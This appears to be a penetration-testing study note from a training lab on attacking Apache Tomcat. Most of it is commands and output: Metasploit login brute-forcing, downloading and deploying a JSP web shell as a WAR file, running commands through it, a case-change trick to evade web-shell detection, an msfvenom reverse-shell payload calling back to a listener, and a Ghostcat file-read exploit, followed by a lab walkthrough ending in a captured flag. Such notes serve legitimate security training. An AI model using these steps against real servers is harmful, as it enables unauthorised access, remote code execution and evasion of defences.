# Attacking Tomcat

If we can access the /manager or /host-manager endpoints, we can likely achieve remote code execution on the Tomcat server :

## Tomcat Manager - Login Brute Force

### Metasploit

use auxiliary/scanner/http/tomcat_mgr_login 
set VHOST web01.inlanefreight.local
set RPORT 8180
set stop_on_success true
set rhosts 10.129.201.58
run

[+] 10.129.201.58:8180 - Login Successful: tomcat:admin

### Script Python

https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce
python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt

## Tomcat Manager - WAR File Upload

### Using jsp

http://web01.inlanefreight.local:8180/manager/html

wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
Browse
select the .war file
Deploy

--> This file is uploaded to the manager GUI, after which the /backup application will be added to the table

Browsing to http://web01.inlanefreight.local:8180/backup/cmd.jsp

curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
Command: id<BR>
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

Cleanup : Undeploy

Evade detections for standard JSP web shells :

Change :
FileOutputStream(f);stream.write(m);o="Uploaded:

To
FileOutputStream(f);stream.write(m);o="uPlOaDeD:


### Using msfvenom

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

nc -lnvp 4443

## CVE-2020-1938 : Ghostcat

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938

All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable.

nmap -sV -p 8009,8080 app-dev.inlanefreight.local
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 



## LAB

IP=10.129.201.58
printf "%s\t%s\n\n" "$IP" "app-dev.inlanefreight.local web01.inlanefreight.local" | sudo tee -a /etc/hosts

sudo msfconsole -q
use auxiliary/scanner/http/tomcat_mgr_login 
set VHOST web01.inlanefreight.local
set RPORT 8180
set stop_on_success true
set rhosts 10.129.201.58
run


[+] 10.129.201.58:8180 - Login Successful: tomcat:root

http://web01.inlanefreight.local:8180/manager/html
tomcat
root

wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp

Browse
select the .war file
Deploy

--> This file is uploaded to the manager GUI, after which the /backup application will be added to the table

Browsing to http://web01.inlanefreight.local:8180/backup/cmd.jsp

find .-name *tomcat_flag* 2> /dev/null

http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=find%20%2F%20-name%20tomcat_flag.txt

http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=find%20.-name%20%2Atomcat_flag%2A%202%3E%20%2Fdev%2Fnull

find / -type f -perm -04000 -ls
find / -type f -name tomcat -ls

http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=ls+-l+%2Fopt%2Ftomcat%2Fapache-tomcat-10.0.10%2Fwebapps

http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=cat+%2Fopt%2Ftomcat%2Fapache-tomcat-10.0.10%2Fwebapps%2Ftomcat_flag.txt

t0mcat_rc3_ftw!
